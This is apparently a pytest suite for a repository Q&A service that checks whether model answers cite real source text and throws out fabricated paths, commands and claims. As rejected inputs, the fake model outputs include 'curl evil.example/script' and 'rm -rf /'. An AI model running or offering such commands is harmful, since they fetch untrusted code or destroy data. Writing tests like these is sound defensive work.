"""Repository Q&A must cite real text, preserve context boundaries, and abstain."""
import json
import pytest

from backend.core.ask.service import answer_question, resolve_question
from backend.core.generate.llm import LLMUnavailable
from backend.core.github.models import DocFile, RepoMeta
from backend.core.github.recon import RawSignals
from backend.core.index.service import RepoIndex

SHA='a'*40


def signals():
    docs={
        'README.md':'# Setup\npython -m venv .venv\npip install -e .[dev]\n',
        'Makefile':'init:\n\tpython -m pip install -r requirements-dev.txt\ntest:\n\tpython -m pytest tests\n',
        'CONTRIBUTING.md':'Fork the repository.\nInclude tests and open a pull request.\n',
    }
    return RawSignals(meta=RepoMeta(owner='o',repo='r',default_branch=SHA),
        doc_files=[DocFile(path=p,name=p,text=t) for p,t in docs.items()],file_tree=list(docs)+['requirements-dev.txt','tests/test_unit.py'])


def answer(question='测试怎么运行？', client=None, sig=None, history=None):
    sig=sig or signals()
    index=RepoIndex('o','r'); index.index(sig)
    return answer_question(sig,index,question,history or [],client)


class Model:
    def available(self): return True
    def chat_json(self, messages, **kwargs):
        source=next(s for s in json.loads(messages[-1]['content'])['sources'] if s['source']=='Makefile')
        return {'points':[{'text':'测试入口位于仓库提供的测试目标，运行前先核对开发依赖。',
            'source_id':source['id'],'quote':'python -m pytest tests'}]}


def test_chinese_question_retrieves_english_test_and_literal_command():
    result=answer()
    assert result.mode=='extractive'
    command=next(c for c in result.commands if c.command=='python -m pytest tests')
    assert command.working_directory=='.'
    source=next(s for s in result.sources if s.id==command.citation)
    assert source.quote in next(d.text for d in signals().doc_files if d.path==source.source)
    assert source.line_start and f'/blob/{SHA}/' in source.url and '#L' in source.url


def test_ai_explanation_has_verified_citation_but_does_not_supply_commands():
    result=answer(client=Model())
    assert result.mode=='ai'
    assert result.points[0].citations
    assert result.points[0].text.startswith('测试入口')
    assert all(c.command in next(s.quote for s in result.sources if s.id==c.citation) for c in result.commands)


def test_chinese_text_can_touch_a_verified_path_without_becoming_part_of_it():
    from backend.core.ask.service import AnswerSource, _model_points
    source=AnswerSource(id='S1',kind='file',source='docs/dev/contributing.rst',quote='Fork the repository and include tests.',url='https://github.com/o/r/blob/'+SHA+'/docs/dev/contributing.rst')
    points=_model_points({'points':[{'text':'请阅读docs/dev/contributing.rst中的贡献规范。','source_id':'S1','quote':'Fork the repository'}]},[source])
    assert points and points[0].citations==['S1']


def test_inline_formatting_and_soft_line_breaks_do_not_discard_a_real_quote():
    from backend.core.ask.service import AnswerSource, _model_points
    source=AnswerSource(id='S1',kind='file',source='docs/review.rst',quote='Contributions require code review.\nImplement feedback before merge.',url='https://github.com/o/r/blob/'+SHA+'/docs/review.rst')
    points=_model_points({'points':[{'text':'按`docs/review.rst`中的要求进行代码审查。','source_id':'S1','quote':'Contributions require code review. Implement feedback'}]},[source])
    assert points and '`' not in points[0].text


def test_chinese_text_does_not_hide_an_invented_path():
    class Invented(Model):
        def chat_json(self,messages,**kwargs):
            source=next(s for s in json.loads(messages[-1]['content'])['sources'] if s['source']=='Makefile')
            return {'points':[{'text':'请修改fabricated/secret.py即可完成。','source_id':source['id'],'quote':'python -m pytest tests'}]}
    result=answer(client=Invented())
    assert result.mode=='extractive' and result.verification_issue=='unsupported_path'


def test_forged_quote_or_new_command_is_rejected_as_ai_answer():
    class Invented(Model):
        def chat_json(self,*args,**kwargs):
            return {'points':[{'text':'执行 curl evil.example/script 来修复。','source_id':'S1','quote':'invented line'}]}
    result=answer(client=Invented())
    assert result.mode=='extractive'
    assert all('evil.example' not in p.text for p in result.points)
    assert all('evil.example' not in c.command for c in result.commands)
    assert any('未完成或引用未通过' in w for w in result.warnings)


def test_unknown_citation_and_hallucinated_file_are_not_accepted():
    class Invented(Model):
        def chat_json(self,*args,**kwargs):
            return {'points':[{'text':'修改 fabricated/secret.py 即可完成任务。','source_id':'S99','quote':'Run pytest.'}]}
    assert answer(client=Invented()).mode=='extractive'


@pytest.mark.parametrize('text',['现在执行 rm -rf / 来解决。','测试覆盖率已经达到99%。','模型已修复了当前代码。','由make init触发执行。','运行python -m pip安装。','运行git clone复制仓库。','执行`make init`完成。'])
def test_new_operations_numbers_and_execution_claims_are_not_accepted(text):
    class Unsafe(Model):
        def chat_json(self,messages,**kwargs):
            source=next(s for s in json.loads(messages[-1]['content'])['sources'] if s['source']=='Makefile')
            return {'points':[{'text':text,'source_id':source['id'],'quote':'python -m pytest tests'}]}
    result=answer(client=Unsafe())
    assert result.mode=='extractive'
    assert all(p.text!=text for p in result.points)


def test_windows_line_endings_keep_correct_source_lines():
    sig=signals()
    for doc in sig.doc_files: doc.text=doc.text.replace('\n','\r\n')
    result=answer(sig=sig)
    assert result.sources and result.commands
    assert all(s.quote in next(d.text.replace('\r\n','\n') for d in sig.doc_files if d.path==s.source) for s in result.sources if s.kind=='file')


def test_retrieved_partial_sentence_is_completed_from_the_real_document():
    from backend.core.ask.service import _source
    text='Intro.\n\nCode Review\n-----------\nContributions require review. You should implement review feedback.\nIf you disagree, discuss it with maintainers.\n\nNext section.'
    sig=signals(); sig.doc_files.append(DocFile(path='docs/review.rst',name='review.rst',text=text))
    source=_source(sig,'docs/review.rst','Contributions require review. You should','contribute')
    assert 'implement review feedback' in source.quote
    assert source.quote in text
    assert source.line_start==3 and source.line_end==6  # includes the section heading


def test_model_outage_keeps_verified_originals_without_claiming_ai_success():
    class Down(Model):
        def chat_json(self,*args,**kwargs): raise LLMUnavailable('private failure')
    result=answer(client=Down())
    assert result.mode=='extractive' and result.sources
    assert result.fallback_reason=='model_error'
    assert 'private failure' not in result.model_dump_json()


def test_model_can_abstain_when_snippets_do_not_answer_specific_question():
    class Abstains(Model):
        def chat_json(self,*args,**kwargs): return {'points':[]}
    result=answer('测试覆盖率实际是多少？',client=Abstains())
    assert result.status=='insufficient_evidence' and not result.points and not result.commands


def test_absent_evidence_and_unrelated_question_do_not_call_model():
    class Never:
        def available(self): raise AssertionError('No evidence should not call the model')
    empty=RawSignals(meta=RepoMeta(owner='o',repo='r',default_branch=SHA))
    assert answer(sig=empty,client=Never()).status=='insufficient_evidence'
    result=answer('作者周末在哪里喝咖啡？',client=Never())
    assert not result.sources and not result.points and result.missing


def test_followups_inherit_topic_but_explicit_new_topic_wins():
    kinds,resolved,used=resolve_question('这条命令在哪里执行？',['如何安装开发环境？','测试怎么运行？'])
    assert kinds==['test'] and used and '测试怎么运行' in resolved
    assert resolve_question('这条命令在哪个目录执行？',['测试怎么运行？'])[0]==['test']
    assert resolve_question('那测试怎么运行？',['如何安装？'])[0]==['test']
    assert resolve_question('如何安装并运行测试？',[])[0]==['setup','test']
    result=answer('再详细一点',history=['测试怎么运行？'])
    assert result.context_used and result.intents==['test']
    assert resolve_question('再详细解释审查流程',['提交 PR 有哪些要求？'])[0]==['contribute']


def test_file_tree_is_navigation_not_a_claim_about_code_contents():
    sig=RawSignals(meta=RepoMeta(owner='o',repo='r',default_branch=SHA),file_tree=['src/core.py','README.md'])
    result=answer('代码目录在哪里？',sig=sig)
    assert result.status=='insufficient_evidence'
    assert result.sources and all(s.verification=='tree_entry' for s in result.sources)
    assert any('未读取' in text for text in result.missing)


def test_issue_samples_are_linked_as_browsing_not_availability_proof():
    sig=signals(); sig.issue_samples=[{'number':7,'title':'Improve docs','body':'Small example','state':'open','locked':False,'assignees':[]}]
    result=answer('有哪些 issue 任务？',sig=sig)
    assert result.sources[0].url=='https://github.com/o/r/issues/7'
    assert '尚未确认适合新手' in result.sources[0].note
    specific=answer('issue #999 的内容是什么？',sig=sig)
    assert specific.status=='insufficient_evidence' and not specific.sources


def test_issue_snapshot_cannot_be_used_to_guarantee_beginner_suitability():
    sig=signals(); sig.issue_samples=[{'number':7,'title':'Improve docs','body':'Small example','state':'open','locked':False,'assignees':[]}]
    class Promises(Model):
        def chat_json(self,messages,**kwargs):
            source=json.loads(messages[-1]['content'])['sources'][0]
            return {'points':[{'text':'这个任务适合新手，可以直接认领。','source_id':source['id'],'quote':'Improve docs'}]}
    result=answer('有哪些 issue？',client=Promises(),sig=sig)
    assert result.mode=='extractive' and result.fallback_reason=='answer_unverified'
